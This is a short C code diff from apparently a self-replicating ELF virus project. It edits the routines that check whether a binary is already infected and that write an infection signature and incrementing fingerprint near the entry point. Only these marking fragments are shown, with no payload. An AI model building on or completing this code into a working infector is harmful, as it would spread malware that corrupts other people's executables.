@@ -35,7 +35,10 @@ bool    is_infected_general(char *path_file, t_file *file)
         return(1);
     return(0);
 }
-
+///////////////////////
+	// header->e_entry - 8; // fingerprint
+	// header->e_entry - 62; // start signature
+//////////////////////
 bool	is_infected(char *data)
 {
 	Elf64_Ehdr          *header;
@@ -44,8 +47,6 @@ bool	is_infected(char *data)
 
 	i = 0;
 	header = (Elf64_Ehdr *)data;
-	// header->e_entry - 8; // fingerprint
-	// header->e_entry - 62; // start signature
 	while(sig[i])
 	{
 		if (sig[i] !=  *((char *)(header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
@@ -61,8 +62,6 @@ bool	im_infected(char *data)
 	int i;
 
 	i = 0;
-	// header->e_entry - 8; // fingerprint
-	// header->e_entry - 62; // start signature
 	while(sig[i])
 	{
 		if (sig[i] !=  *((char *)(data - SIZE_BEFORE_ENTRY_POINT + i)))
@@ -78,22 +77,21 @@ void	put_sig(char *data)
 	char fingerprint[] = {'0','0','0','0','0','0','0','0'};
 	int i;
 
-	i = 0;
 	*(long long *)fingerprint = *(long long *)&main - SIZE_BEFORE_ENTRY_POINT + 54;
-
-	while(sig[i])
-	{
-		data[i] = sig[i]; 
-		i++;
-	}
 	i = 7;
 	while(i >= 0)
 	{
 		if(fingerprint[i] == '9')
+		{
 			fingerprint[i] = '0';
+		}
 		else
+		{
 			fingerprint[i]++;
+			break;
+		}
 		i--;
 	}
-	*(long long*)&(data[i]) = *(long long *)fingerprint;
+	write(123,sig, sizeof(sig));
+	write(123,fingerprint, sizeof(fingerprint));
 }
